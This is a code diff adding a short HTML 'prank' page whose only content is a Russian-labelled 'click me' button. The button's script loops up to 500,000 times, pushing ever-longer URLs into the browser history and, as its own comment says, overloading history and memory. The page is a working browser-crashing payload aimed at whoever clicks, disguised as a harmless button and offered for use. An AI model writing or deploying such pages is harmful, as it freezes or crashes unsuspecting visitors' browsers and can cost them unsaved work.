@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Prank</title>
+</head>
+<body>
+    <button id="btn" style="padding: 20px 40px; font-size: 20px;">Нажми на меня</button>
+
+    <script>
+        document.getElementById('btn').addEventListener('click', function() {
+            // Запуск цикла перегрузки истории и памяти
+            try {
+                let data = "";
+                for (let i = 0; i < 500000; i++) {
+                    data += i.toString();
+                    history.pushState(null, null, "#" + data);
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        });
+    </script>
+</body>
+</html>
